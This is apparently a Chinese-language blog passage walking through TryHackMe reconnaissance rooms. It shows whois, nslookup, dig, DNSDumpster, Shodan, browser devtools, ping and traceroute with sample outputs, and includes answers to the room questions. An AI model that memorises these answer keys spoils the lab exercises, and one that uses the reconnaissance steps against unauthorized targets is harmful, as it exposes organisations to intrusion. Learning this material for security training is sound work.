+<figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@TryHackMe</span>$ whois tryhackme.com<br>[Querying whois.verisign-grs.com]<br>[Redirected to whois.namecheap.com]<br>[Querying whois.namecheap.com]<br>[whois.namecheap.com]<br>Domain <span class="hljs-attribute">name</span>: tryhackme.com<br>Registry Domain <span class="hljs-attribute">ID</span>: <span class="hljs-number">2282723194</span>_DOMAIN_COM-VRSN<br>Registrar WHOIS <span class="hljs-attribute">Server</span>: whois.namecheap.com<br>Registrar <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>://www.namecheap.com<br>Updated <span class="hljs-attribute">Date</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">05</span>-<span class="hljs-number">01</span>T19:<span class="hljs-number">43</span>:<span class="hljs-number">23.31</span>Z<br>Creation <span class="hljs-attribute">Date</span>: <span class="hljs-number">2018</span>-<span class="hljs-number">07</span>-<span class="hljs-number">05</span>T19:<span class="hljs-number">46</span>:<span class="hljs-number">15.00</span>Z<br>Registrar Registration Expiration <span class="hljs-attribute">Date</span>: <span class="hljs-number">2027</span>-<span class="hljs-number">07</span>-<span class="hljs-number">05</span>T19:<span class="hljs-number">46</span>:<span class="hljs-number">15.00</span>Z<br><span class="hljs-attribute">Registrar</span>: NAMECHEAP INC<br>Registrar IANA <span class="hljs-attribute">ID</span>: <span class="hljs-number">1068</span><br>Registrar Abuse Contact <span class="hljs-attribute">Email</span>: abuse<span class="hljs-keyword">@namecheap</span>.com<br>Registrar Abuse Contact <span class="hljs-attribute">Phone</span>: +<span class="hljs-number">1.6613102107</span><br><span class="hljs-attribute">Reseller</span>: NAMECHEAP INC<br>Domain <span class="hljs-attribute">Status</span>: clientTransferProhibited <span class="hljs-attribute">https</span>://icann.org/epp#clientTransferProhibited<br>Registry Registrant <span class="hljs-attribute">ID</span>: <br>Registrant <span class="hljs-attribute">Name</span>: Withheld for Privacy Purposes<br>Registrant <span class="hljs-attribute">Organization</span>: Privacy service provided by Withheld for Privacy ehf<br>[...]<br>URL of the ICANN WHOIS Data Problem Reporting <span class="hljs-attribute">System</span>: <span class="hljs-attribute">http</span>://wdprs.internic.net/<br>&gt;&gt;&gt; Last <span class="hljs-attribute">update</span> of WHOIS <span class="hljs-attribute">database</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">08</span>-<span class="hljs-number">25</span>T14:<span class="hljs-number">58</span>:<span class="hljs-number">29.57</span>Z &lt;&lt;&lt;<br>For more information on Whois status codes, please visit <span class="hljs-attribute">https</span>://icann.org/epp<br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到很多信息； 我们将按照显示的顺序检查它们。 首先，我们注意到我们被重定向到 whois.namecheap.com 以获取我们的信息。 在这种情况下，namecheap.com 目前正在维护该域名的 WHOIS 记录。 此外，我们可以看到创建日期以及最后更新日期和到期日期。</p>
+<p>接下来，我们获取有关注册服务商和注册人的信息。 我们可以找到注册人的姓名和联系信息，除非他们使用某些隐私服务。 虽然上面没有显示，但我们得到了这个域的管理员和技术联系人。 最后，如果我们有任何 DNS 记录要查找，我们会看到我们应该查询的域名服务器。</p>
+<p>可以检查收集到的信息以发现新的攻击面，例如社会工程或技术攻击。 例如，根据渗透测试的范围，您可能会考虑对管理员用户的电子邮件服务器或 DNS 服务器进行攻击，假设它们归您的客户所有并且在渗透测试的范围内。</p>
+<p>值得注意的是，由于自动化工具滥用 WHOIS 查询来收集电子邮件地址，许多 WHOIS 服务都对此采取了措施。 例如，他们可能会编辑电子邮件地址。 此外，许多注册人订阅了隐私服务，以避免他们的电子邮件地址被垃圾邮件发送者收集并保护他们的信息的私密性。</p>
+<p>在 AttackBox 上，打开终端并运行 whois tryhackme.com 命令以获取回答以下问题所需的信息。</p>
+<p><strong>回答以下问题：</strong></p>
+<p>TryHackMe.com 是什么时候注册的？</p>
+<p>答：20180705</p>
+<p>TryHackMe.com 的注册商是什么？</p>
+<p>答：namecheap.com</p>
+<p>TryHackMe.com 使用哪家公司的名称服务器？</p>
+<p>答：cloudflare.com</p>
+<h4 id="14-nslookup-和-dig"><a href="#1-4-nslookup-和-dig" class="headerlink" title="1.4 nslookup 和 dig"></a>1.4 nslookup 和 dig</h4><p>在前面的任务中，我们使用 WHOIS 协议来获取有关我们正在查找的域名的各种信息。 特别是，我们能够从注册商那里获得 DNS 服务器。</p>
+<p>使用 nslookup 查找域名的 IP 地址，nslookup 代表名称服务器查找。 您需要发出命令 nslookup DOMAIN_NAME，例如，nslookup tryhackme.com。 或者，更一般地说，您可以使用 nslookup OPTIONS DOMAIN_NAME SERVER。 这三个主要参数是：</p>
+<ul>
+<li>OPTIONS 包含查询类型，如下表所示。 例如，您可以将 A 用于 IPv4 地址，将 AAAA 用于 IPv6 地址。</li>
+<li>DOMAIN_NAME 是您正在查找的域名。</li>
+<li>SERVER 是您要查询的 DNS 服务器。 您可以选择任何本地或公共 DNS 服务器进行查询。 Cloudflare 提供 1.1.1.1 和 1.0.0.1，Google 提供 8.8.8.8 和 8.8.4.4，Quad9 提供 9.9.9.9 和 149.112.112.112。 如果您想要 ISP 的 DNS 服务器的替代方案，您可以选择更多的公共 DNS 服务器。</li>
+</ul>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/image-20230204151657121.png" alt="image-20230204151657121"></p>
+<p>例如，nslookup -type&#x3D;A tryhackme.com 1.1.1.1（或 nslookup -type&#x3D;a tryhackme.com 1.1.1.1，因为它不区分大小写）可用于返回 tryhackme.com 使用的所有 IPv4 地址。</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">user<span class="hljs-keyword">@TryHackMe</span>$ nslookup -type=A tryhackme.com <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><br><span class="hljs-attribute">Server</span>:		<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><br><span class="hljs-attribute">Address</span>:	<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>#<span class="hljs-number">53</span><br><br>Non-authoritative <span class="hljs-attribute">answer</span>:<br><span class="hljs-attribute">Name</span>:	tryhackme.com<br><span class="hljs-attribute">Address</span>: <span class="hljs-number">172.67</span>.<span class="hljs-number">69.208</span><br><span class="hljs-attribute">Name</span>:	tryhackme.com<br><span class="hljs-attribute">Address</span>: <span class="hljs-number">104.26</span>.<span class="hljs-number">11.229</span><br><span class="hljs-attribute">Name</span>:	tryhackme.com<br><span class="hljs-attribute">Address</span>: <span class="hljs-number">104.26</span>.<span class="hljs-number">10.229</span><br></code></pre></td></tr></table></figure>
+
+<p>A 和 AAAA 记录分别用于返回 IPv4 和 IPv6 地址。 这种查找有助于从渗透测试的角度了解。 在上面的示例中，我们从一个域名开始，并获得了三个 IPv4 地址。 如果这些 IP 地址在渗透测试的范围内，则可以进一步检查每个 IP 地址的不安全性。</p>
+<p>假设您想了解特定域的电子邮件服务器和配置。 您可以发出 nslookup -type&#x3D;MX tryhackme.com。 这是一个例子：</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">user@TryHackMe$ nslookup -type=MX tryhackme<span class="hljs-selector-class">.com</span><br>Server:		<span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span><br>Address:	<span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>tryhackme<span class="hljs-selector-class">.com</span>	mail exchanger = <span class="hljs-number">5</span> alt1<span class="hljs-selector-class">.aspmx</span><span class="hljs-selector-class">.l</span><span class="hljs-selector-class">.google</span><span class="hljs-selector-class">.com</span>.<br>tryhackme<span class="hljs-selector-class">.com</span>	mail exchanger = <span class="hljs-number">1</span> aspmx<span class="hljs-selector-class">.l</span><span class="hljs-selector-class">.google</span><span class="hljs-selector-class">.com</span>.<br>tryhackme<span class="hljs-selector-class">.com</span>	mail exchanger = <span class="hljs-number">10</span> alt4<span class="hljs-selector-class">.aspmx</span><span class="hljs-selector-class">.l</span><span class="hljs-selector-class">.google</span><span class="hljs-selector-class">.com</span>.<br>tryhackme<span class="hljs-selector-class">.com</span>	mail exchanger = <span class="hljs-number">10</span> alt3<span class="hljs-selector-class">.aspmx</span><span class="hljs-selector-class">.l</span><span class="hljs-selector-class">.google</span><span class="hljs-selector-class">.com</span>.<br>tryhackme<span class="hljs-selector-class">.com</span>	mail exchanger = <span class="hljs-number">5</span> alt2<span class="hljs-selector-class">.aspmx</span><span class="hljs-selector-class">.l</span><span class="hljs-selector-class">.google</span><span class="hljs-selector-class">.com</span>.<br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到tryhackme.com当前的邮箱配置使用的是谷歌。 由于 MX 正在查找邮件交换服务器，我们注意到当邮件服务器尝试发送电子邮件@tryhackme.com 时，它会尝试连接到 aspmx.l.google.com，它的顺序为 1。如果它正忙 或不可用，邮件服务器将尝试连接到下一个邮件交换服务器，alt1.aspmx.l.google.com 或 alt2.aspmx.l.google.com。</p>
+<p>Google 提供列出的邮件服务器； 因此，我们不应期望邮件服务器运行易受攻击的服务器版本。 但是，在其他情况下，我们可能会发现邮件服务器没有得到足够的保护或修补。</p>
+<p>当您继续对目标进行被动侦察时，这些信息可能会被证明是有价值的。 您可以对其他域名重复类似的查询并尝试不同的类型，例如 -type&#x3D;txt。 谁知道您会在途中发现什么样的信息！</p>
+<p>对于更高级的 DNS 查询和其他功能，如果您好奇的话，可以使用 dig，它是“Domain Information Groper”的首字母缩写词。 让我们使用 dig 来查找 MX 记录并将它们与 nslookup 进行比较。 我们可以使用 dig DOMAIN_NAME，但要指定记录类型，我们将使用 dig DOMAIN_NAME TYPE。 或者，我们可以使用 dig @SERVER DOMAIN_NAME TYPE 选择我们想要查询的服务器。</p>
+<ul>
+<li>SERVER 是您要查询的 DNS 服务器。</li>
+<li>DOMAIN_NAME 是您正在查找的域名。</li>
+<li>TYPE 包含 DNS 记录类型，如前面提供的表中所示。</li>
+</ul>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">user<span class="hljs-title">@TryHackMe$</span> dig tryhackme.com MX<br><br><span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.16.19-RH &lt;&lt;&gt;&gt; tryhackme.com MX</span><br><span class="hljs-comment">;; global options: +cmd</span><br><span class="hljs-comment">;; Got answer:</span><br><span class="hljs-comment">;; -&gt;&gt;HEADER&lt;</span><br></code></pre></td></tr></table></figure>
+
+<p>nslookup 和 dig 的输出之间的快速比较表明 dig 返回了更多信息，例如默认情况下的 TTL（生存时间）。 如果要查询 1.1.1.1 的 DNS 服务器，可以执行 dig @1.1.1.1 tryhackme.com MX。</p>
+<p>使用 AttackBox，打开终端并使用 nslookup 或 dig 命令获取回答以下问题所需的信息。</p>
+<p><strong>回答以下问题：</strong></p>
+<p>查看thmlabs.com的TXT记录。 那里的 FLAG 是什么？</p>
+<h4 id="15-dnsdumpster"><a href="#1-5-DNSDumpster" class="headerlink" title="1.5 DNSDumpster"></a>1.5 DNSDumpster</h4><p>nslookup 和 dig 等 DNS 查找工具无法自行查找子域。 您正在检查的域可能包含一个不同的子域，该子域可以揭示有关目标的大量信息。 例如，如果 tryhackme.com 有子域 wiki.tryhackme.com 和 webmail.tryhackme.com，你想了解更多关于这两个的信息，因为它们可以保存关于你的目标的大量信息。 有可能这些子域之一已经设置并且没有定期更新。 缺乏适当的定期更新通常会导致易受攻击的服务。 但是我们怎么知道这样的子域存在呢？</p>
+<p>我们可以考虑使用多个搜索引擎来编制一个公开的子域列表。 一个搜索引擎是不够的； 此外，我们应该期望至少浏览数十个结果才能找到有趣的数据。 毕竟，您正在寻找未明确公布的子域，因此没有必要使其进入搜索结果的第一页。 另一种发现此类子域的方法是依靠暴力查询来查找哪些子域具有 DNS 记录。</p>
+<p>为避免这种耗时的搜索，可以使用提供 DNS 查询详细答案的在线服务，例如 DNSDumpster。 如果我们在 DNSDumpster 中搜索 tryhackme.com，我们会发现子域 blog.tryhackme.com，这是典型的 DNS 查询无法提供的。 此外，DNSDumpster 将以易于阅读的表格和图表的形式返回收集到的 DNS 信息。 DNSDumpster 还将提供有关侦听服务器的所有收集信息。</p>
+<p>我们将在 DNSDumpster 上搜索 tryhackme.com，让您大致了解预期的输出。 在结果中，我们得到了我们正在查找的域的 DNS 服务器列表。 DNSDumpster 还将域名解析为 IP 地址，甚至尝试对它们进行地理定位。 我们还可以看到MX记录； DNSDumpster 将所有五个邮件交换服务器解析为各自的 IP 地址，并提供有关所有者和位置的更多信息。 最后，我们可以看到TXT记录。 实际上，单个查询就足以检索所有这些信息。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/655c1ce6c3bb53e6252128b6da135ba9.png" alt="img"></p>
+<p>DNSDumpster 还将以图形方式表示收集到的信息。 DNSDumpster 将之前表格中的数据显示为图表。 您可以看到 DNS 和 MX 分支到各自的服务器并显示 IP 地址。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/844a43bc37547bbb13f94894605992d3.png" alt="img"></p>
+<p>目前有一个测试版功能，允许您也导出图表。 如果需要，您可以操纵图形并四处移动块。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/eb95e62815b6ace3c823fd0159884731.png" alt="img"></p>
+<p>使用 AttackBox 或您的系统上的 Web 浏览器来回答以下问题。</p>
+<p><strong>回答以下问题：</strong></p>
+<p>在 <a href="https://dnsdumpster.com/">DNSDumpster</a> 上查找 tryhackme.com。 除了 www 和 blog，您还会发现一个有趣的子域是什么？</p>
+<h4 id="16-shodanio"><a href="#1-6-Shodan-io" class="headerlink" title="1.6 Shodan.io"></a>1.6 Shodan.io</h4><p>当您的任务是针对特定目标运行渗透测试时，作为被动侦察阶段的一部分，像 <a href="https://www.shodan.io/">Shodan.io</a> 这样的服务可以帮助您了解有关客户端网络的各种信息，而无需主动连接到它。 此外，在防御方面，您可以使用 Shodan.io 的不同服务来了解属于您组织的已连接和暴露的设备。</p>
+<p>Shodan.io 试图连接到每一个可在线访问的设备，以构建一个连接 “things 事物” 的搜索引擎，而不是网页搜索引擎。 一旦得到响应，它就会收集与该服务相关的所有信息并将其保存在数据库中以便于搜索。 考虑其中一个 tryhackme.com 服务器的保存记录。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/a8ac6c22a64b8413ee8d02c2224eddac.png" alt="img"></p>
+<p>这条记录显示了一个网络服务器； 然而，如前所述，Shodan.io 收集与它可以找到的任何在线连接设备相关的信息。 在 Shodan.io 上搜索 tryhackme.com 至少会显示上图所示的记录。 通过这个 Shodan.io 搜索结果，我们可以了解到与我们的搜索相关的几件事，例如：</p>
+<ul>
+<li><p>IP地址</p>
+</li>
+<li><p>托管公司</p>
+</li>
+<li><p>地理位置</p>
+</li>
+<li><p>服务器类型和版本</p>
+</li>
+<li><p>您也可以尝试搜索从 DNS 查找中获得的 IP 地址。 当然，这些更容易发生变化。 在他们的帮助页面上，您可以了解 Shodan.io 上可用的所有搜索选项，我们鼓励您加入 TryHackMe 的 Shodan.io。</p>
+</li>
+</ul>
+<p>最好访问 Shodan.io 来回答以下问题； 但是请注意，您无需高级帐户即可在 Shodan.io 上找到答案。</p>
+<p><strong>回答以下问题：</strong></p>
+<p>根据 Shodan.io，就可公开访问的 Apache 服务器数量而言，世界第二的国家是哪个？</p>
+<p>答：Germany</p>
+<p>基于 Shodan.io，Apache 使用的第三大最常用端口是什么？</p>
+<p>答：8080</p>
+<p>基于 Shodan.io，用于 nginx 的第三个最常用端口是什么？</p>
+<p>答：8888</p>
+<h4 id="17-summary-总结"><a href="#1-7-Summary-总结" class="headerlink" title="1.7 Summary 总结"></a>1.7 Summary 总结</h4><p>在这个房间里，我们专注于被动侦察。 我们特别介绍了命令行工具、whois、nslookup 和 dig。 我们还讨论了两个公开可用的服务 DNSDumpster 和 Shodan.io。 此类工具的强大之处在于，您可以在不直接连接目标的情况下收集有关目标的信息。 此外，一旦您掌握了搜索选项并习惯阅读结果，使用此类工具可能会发现大量信息。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/image-20230204155624764.png" alt="image-20230204155624764"></p>
+<p>请务必记下本房间讨论的所有要点，尤其是命令行工具的语法。</p>
+]]></content>
+      <categories>
+        <category>tryhackme</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tryhackme渗透测试-ActiveReconnaissance主动侦察</title>
+    <url>/2023/02/04/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>来到主动侦擦篇章</p>
+<span id="more"></span>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>了解如何使用简单的工具（例如 traceroute、ping、telnet 和 Web 浏览器）来收集信息。</p>
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在网络安全模块的第一个房间，我们专注于<a href="https://tryhackme.com/jr/passiverecon">被动侦察</a>。在第二个房间，我们专注于主动侦察和与之相关的基本工具。我们学习使用网络浏览器来收集有关目标的更多信息。此外，我们还讨论了使用 <code>ping</code>、<code>traceroute</code>、<code>telnet</code> 等简单工具来收集网络、系统和服务的信息。</p>
+<p>正如我们在上一个房间中了解到的那样，被动侦察可以让您在没有任何直接参与或联系的情况下收集有关目标的信息。您正在远距离观看或查看公开信息。</p>
+<p>主动侦察要求您与目标进行某种接触。这种联系可以是打电话或拜访目标公司，借口是收集更多信息，通常是社会工程的一部分。或者，它可以直接连接到目标系统，无论是访问他们的网站还是检查他们的防火墙是否打开了 SSH 端口。把它想象成你正在仔细检查窗户和门锁。因此，必须记住，在获得客户签署的合法授权之前，不要从事主动侦察工作。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/cfe90ebdead91f2a1abd30833b22b001.png" alt="img"></p>
+<p>在这个房间里，我们专注于主动侦察。主动侦察始于与目标机器的直接连接。任何此类连接都可能在日志中留下信息，显示客户端 IP 地址、连接时间和连接持续时间等。但是，并非所有连接都是可疑的。可以让您的主动侦察显示为常规客户活动。考虑网页浏览；在数百名其他合法用户中，没有人会怀疑浏览器连接到目标网络服务器。当你作为红队（攻击者）的一部分工作时，你可以使用这些技术来发挥你的优势，并且不想惊动蓝队（防御者）。</p>
+<p>在这个房间里，我们将介绍通常与大多数操作系统捆绑在一起或很容易获得的各种工具。我们从 Web 浏览器及其内置的开发人员工具开始；此外，我们还向您展示了如何“武装”网络浏览器以使其成为高效的侦察框架。之后，我们讨论其他良性工具，例如<code>ping</code>、<code>traceroute</code>和<code>telnet</code>。所有这些程序都需要与目标建立联系，因此我们的活动将受到主动侦察。</p>
+<p>任何想要熟悉基本工具并了解如何在主动侦察中使用它们的人都会对这个房间感兴趣。Web 浏览器开发人员工具可能需要一些努力才能熟悉，尽管它提供了图形用户界面。所涵盖的命令行工具使用起来相对简单。</p>
+<p><em><strong>重要通知</strong>：请注意，如果您未订阅，AttackBox 将无法访问互联网，因此您需要使用 VPN 来完成需要访问互联网的问题。</em></p>
+<p>回答以下问题</p>
+<p>确保您了解为什么这些工具会受到主动侦察。启动您的 AttackBox 并确保它已准备就绪。您将需要它来回答问题，尤其是在后面的任务中。</p>
+<h3 id="网页浏览器"><a href="#网页浏览器" class="headerlink" title="网页浏览器"></a>网页浏览器</h3><p>Web 浏览器可以是一个方便的工具，特别是它在所有系统上都很容易使用。您可以通过多种方式使用 Web 浏览器收集有关目标的信息。</p>
+<p>在传输层，浏览器连接到：</p>
+<ul>
+<li>通过 HTTP 访问网站时，默认使用TCP端口 80</li>
+<li>通过 HTTPS 访问网站时默认使用TCP端口 443</li>
+</ul>
+<p>由于 80 和 443 是HTTP和 HTTPS 的默认端口，因此 Web 浏览器不会在地址栏中显示它们。但是，可以使用自定义端口来访问服务。例如，<a href="https://127.0.0.1:8834/">https://127.0.0.1:8834/</a> 将通过 HTTPS 协议在端口 8834 连接到 127.0.0.1（本地主机）。如果有 HTTPS 服务器侦听该端口，我们将收到一个网页。</p>
+<p>在浏览网页时，您可以<code>Ctrl+Shift+I</code>在 PC 上按 或在 Mac 上按<code>Option + Command + I</code>( <code>⌥ + ⌘ + I</code>) 以打开 Firefox 上的开发者工具。类似的快捷方式也可以让您开始使用 Google Chrome 或 Chromium。开发人员工具可让您检查浏览器已接收并与远程服务器交换的许多内容。例如，您可以查看甚至修改 JavaScript (JS) 文件、检查系统上设置的 cookie 并发现站点内容的文件夹结构。</p>
+<p>下面是 Firefox 开发者工具的截图。Chrome DevTools 非常相似。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/02722e27a2e85fa803c2baa52ab54fdf.png" alt="img"></p>
+<p>还有很多适用于 Firefox 和 Chrome 的附加组件可以帮助进行渗透测试。这里有一些例子：</p>
+<ul>
+<li><strong>FoxyProxy</strong> 可让您快速更改用于访问目标网站的代理服务器。当您使用 Burp Suite 等工具或需要定期切换代理服务器时，此浏览器扩展非常方便。<a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard">您可以从这里</a>获得 Firefox 的 FoxyProxy 。</li>
+<li><strong>用户代理切换器和管理</strong>器使您能够假装从不同的操作系统或不同的 Web 浏览器访问网页。换句话说，您可以假装使用 iPhone 浏览网站，而实际上您是从 Mozilla Firefox 访问它。<a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher">您可以在此处</a>下载适用于 Firefox 的用户代理切换器和管理器。</li>
+<li><strong>Wappalyzer</strong> 提供有关所访问网站所用技术的见解。这种扩展很方便，主要是当您像任何其他用户一样在浏览网站时收集所有这些信息时。Wappalyzer 的屏幕截图如下所示。<a href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer">您可以在此处</a>找到适用于 Firefox 的 Wappalyzer 。</li>
+</ul>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/d8db9b9e278502db5ae2a6c12e79d890.png" alt="img"></p>
+<p>随着时间的推移，您可能会发现一些扩展非常适合您的工作流程。</p>
+<p>回答以下问题</p>
+<p>浏览到<a href="https://static-labs.tryhackme.cloud/sites/networking-tcp/">以下网站</a>并确保您已在 AttackBox Firefox 或计算机上的浏览器上打开开发人员工具。使用开发人员工具，计算出问题的总数。</p>
+<h3 id="ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>Ping 应该会让您想起 ping-pong（乒乓球）游戏。你扔球并期望把它拿回来。ping 的主要目的是检查您是否可以到达远程系统以及远程系统是否可以返回您。换句话说，最初，这是用来检查网络连通性的；然而，我们更感兴趣的是它的不同用途：检查远程系统是否在线。</p>
+<p>简单来说，ping 命令向远程系统发送数据包，远程系统回复。这样，您就可以断定远程系统在线并且两个系统之间的网络正常工作。</p>
+<p>如果您喜欢更挑剔的定义，则 ping 是一个将 ICMP Echo 数据包发送到远程系统的命令。如果远程系统在线，并且 ping 数据包被正确路由并且没有被任何防火墙阻止，则远程系统应该发回 ICMP Echo Reply。同样，如果正确路由且未被任何防火墙阻止，ping 回复应该到达第一个系统。</p>
+<p>此类命令的目的是在我们花时间执行更详细的扫描以发现正在运行的操作系统和服务之前确保目标系统在线。</p>
+<p>在您的 AttackBox 终端上，您可以开始使用 ping： <code>ping MACHINE_IP</code>或<code>ping HOSTNAME</code>。在后者中，系统需要在发送 ping 数据包之前将 HOSTNAME 解析为 IP 地址。如果在Linux系统上不指定计数，则需要 输入<code>CTRL+c</code> 强制停止。因此，您可能会考虑 <code>ping -c 10 MACHINE_IP</code> 如果你只想发送十个数据包。这相当于 <code>ping -n 10 MACHINE_IP</code> 在 MS Windows 系统上。</p>
+<p>从技术上讲，ping 属于 ICMP（Internet 控制消息协议）协议。ICMP 支持多种类型的查询，但我们特别感兴趣的是 ping（ICMP echo&#x2F;type 8）和 ping 回复（ICMP echo reply&#x2F;type 0）。使用 ping 不需要了解 ICMP 详细信息。</p>
+<p>在以下示例中，我们已将数据包总数指定为 5。从 AttackBox 的终端，我们开始执行 ping 操作 <code>MACHINE_IP</code> 。我们了解到它 <code>MACHINE_IP </code>已启动并且未阻止 ICMP 回显请求。此外，数据包路由上的任何防火墙和路由器也不会阻止 ICMP 回显请求。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">user@AttackBox$ ping -c 5 MACHINE_IP<br>PING MACHINE_IP (MACHINE_IP) 56(84) bytes of data.<br>64 bytes from MACHINE_IP: icmp_seq=1 ttl=64 time=0.636 ms<br>64 bytes from MACHINE_IP: icmp_seq=2 ttl=64 time=0.483 ms<br>64 bytes from MACHINE_IP: icmp_seq=3 ttl=64 time=0.396 ms<br>64 bytes from MACHINE_IP: icmp_seq=4 ttl=64 time=0.416 ms<br>64 bytes from MACHINE_IP: icmp_seq=5 ttl=64 time=0.445 ms<br><br>--- MACHINE_IP ping statistics ---<br>5 packets transmitted, 5 received, 0% packet loss, time 4097ms<br>rtt min/avg/max/mdev = 0.396/0.475/0.636/0.086 ms<br></code></pre></td></tr></table></figure>
+
+<p>在上面的示例中，我们清楚地看到目标系统正在响应。ping 输出表明它在线且可访问。我们已经发送了五个数据包，并且收到了五个回复。我们注意到，回复到达我们的系统平均需要 0.475 毫秒（毫秒），最大值为 0.636 毫秒。</p>
+<p>从渗透测试的角度来看，我们将尝试发现更多关于这个目标的信息。我们将尝试尽可能多地了解，例如，哪些端口是开放的，哪些服务正在运行。</p>
+<p>让我们考虑以下情况：我们关闭目标虚拟机，然后尝试 ping <code>MACHINE_IP</code>。正如您在以下示例中所期望的那样，我们没有收到任何回复。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">user@AttackBox$ ping -c 5 MACHINE_IP<br>PING MACHINE_IP (MACHINE_IP) 56(84) bytes of data.<br>From ATTACKBOX_IP icmp_seq=1 Destination Host Unreachable<br>From ATTACKBOX_IP icmp_seq=2 Destination Host Unreachable<br>From ATTACKBOX_IP icmp_seq=3 Destination Host Unreachable<br>From ATTACKBOX_IP icmp_seq=4 Destination Host Unreachable<br>From ATTACKBOX_IP icmp_seq=5 Destination Host Unreachable<br><br>--- MACHINE_IP ping statistics ---<br>5 packets transmitted, 0 received, +5 errors, 100% packet loss, time 4098ms<br>pipe 4<br></code></pre></td></tr></table></figure>
+
+<p>在这种情况下，我们知道我们已经关闭了具有 MACHINE_IP 的目标计算机。对于每个 ping，我们使用的系统（在本例中为 AttackBox）都会以 “目标主机无法访问” 作为响应。我们可以看到我们发送了五个数据包，但没有收到，导致 100% 的数据包丢失。</p>
+<p>一般来说，当我们没有收到 ping 回复时，有一些解释可以解释为什么我们没有收到 ping 回复，例如：</p>
+<ul>
+<li>目标计算机没有响应；可能仍在启动或关闭，或者操作系统已崩溃。</li>
+<li>它已从网络上拔下，或者路径上存在故障网络设备。</li>
+<li>防火墙被配置为阻止此类数据包。防火墙可能是在系统本身或单独的网络设备上运行的软件。请注意，默认情况下，MS Windows 防火墙会阻止 ping。</li>
+<li>您的系统已从网络上拔下。</li>
+</ul>
+<p>回答以下问题</p>
+<p>您将使用哪个选项来设置 ICMP 回显请求所携带的数据大小？</p>
+<p>-s</p>
+<p>ICMP 标头的大小（以字节为单位）是多少？</p>
+<p>8</p>
+<p>默认情况下，MS Windows 防火墙是否会阻止 ping？（是&#x2F;否）</p>
+<p>Y</p>
+<p>为此任务 部署VM<code>ping -c 10 MACHINE_IP</code> ，并使用 AttackBox 终端发出命令。您收到了多少 ping 回复？</p>
+<p>10</p>
+<h3 id="追踪路由-traceroute"><a href="#追踪路由-Traceroute" class="headerlink" title="追踪路由 Traceroute"></a>追踪路由 Traceroute</h3><p>顾名思义，<strong>traceroute</strong> 命令跟踪数据包从您的系统到另一台主机所采用的路由。traceroute 的目的是找到路由器的 IP 地址或数据包从您的系统到达目标主机时经过的跃点。该命令还显示了两个系统之间的路由器数量。它很有用，因为它指示您的系统和目标主机之间的跳数（路由器）。但是，请注意，由于许多路由器使用适应网络变化的动态路由协议，数据包采用的路由可能会发生变化。</p>
+<p>在Linux和 macOS 上，要使用的命令是<code>traceroute MACHINE_IP</code>，在 MS Windows 上，它是<code>tracert MACHINE_IP</code>. <code>traceroute</code>尝试发现从您的系统到目标系统的路径上的路由器。</p>
+<p>没有直接的方法来发现从您的系统到目标系统的路径。我们依靠 ICMP 来“欺骗”路由器以泄露其 IP 地址。我们可以通过在 IP 标头字段中使用一个小的生存时间 (TTL) 来实现这一点。虽然TTL中的T代表时间，但TTL表示一个数据包在被丢弃之前可以通过的最大路由器&#x2F;跳数；TTL 不是最大时间单位数。当路由器收到数据包时，它会将 TTL 减一，然后再将其传递给下一个路由器。下图显示，IP 数据包每经过一个路由器，其 TTL 值就会减 1。最初，它留给系统的 TTL 值为 64；经过4个路由器到达目标系统，TTL值为60。</p>
